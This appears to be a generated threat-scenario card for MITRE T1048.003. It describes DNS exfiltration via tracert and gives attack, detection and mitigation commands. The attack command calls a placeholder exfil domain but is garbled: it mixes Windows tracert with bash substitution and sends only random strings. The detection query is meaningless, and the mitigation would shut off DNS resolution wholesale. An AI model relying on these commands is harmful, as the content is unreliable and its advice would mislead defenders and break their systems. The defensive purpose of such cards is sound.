---
type: campaign
scenario_id: 180
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using tracert to exfiltrate data via DNS queries.

## Threat Description
Using tracert to exfiltrate data via DNS queries.

## Attack Command
```
tracert -h 1 $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo exfil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor tracert DNS: `wmic process where name='tracert.exe' get commandline | findstr com`; Analyze DNS logs: `dig +short A *.com`.

## Mitigation
Restrict tracert: `icacls %windir%\System32\tracert.exe /deny Everyone:RX`; Block DNS queries: `named.conf 'zone "." { type master; notify no; allow-query { none; }; };'`.

## AI Training Prompt
Train AI to detect tracert DNS exfiltration and suggest DNS restrictions.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
